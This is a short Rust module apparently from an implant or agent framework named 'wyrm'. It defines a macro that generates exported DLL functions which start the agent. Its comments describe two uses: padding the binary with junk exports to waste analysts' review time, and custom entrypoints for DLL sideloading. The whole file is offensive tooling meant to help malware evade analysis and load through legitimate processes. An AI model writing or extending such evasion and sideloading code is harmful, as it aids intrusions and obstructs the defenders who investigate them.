//! A module for creating either fake exports full of junk, or exports which
//! lead to the running of the agent, customisable via profiles - thanks to the
//! magic of macros.
//!
//! This module would be used for two main reasons:
//!
//! 1) Obfuscation: If you wish to obfuscate the binary by enforcing a number of random
//! exports which take analyst time up to review, then you may wish to add a number of
//! junk export functions.
//!
//! 2) Custom entrypoint: If you wish a custom entrypoint which is not `run`, this will
//! allow you to define that - and it will come in handy for custom DLL sideloading.
//

use crate::entry::start_wyrm;

macro_rules! build_dll_export_by_name_start_wyrm {
    ($name:ident) => {
        #[unsafe(no_mangle)]
        pub extern "system" fn $name() {
            start_wyrm();
        }
    };
}

build_dll_export_by_name_start_wyrm!(testexporthehe);
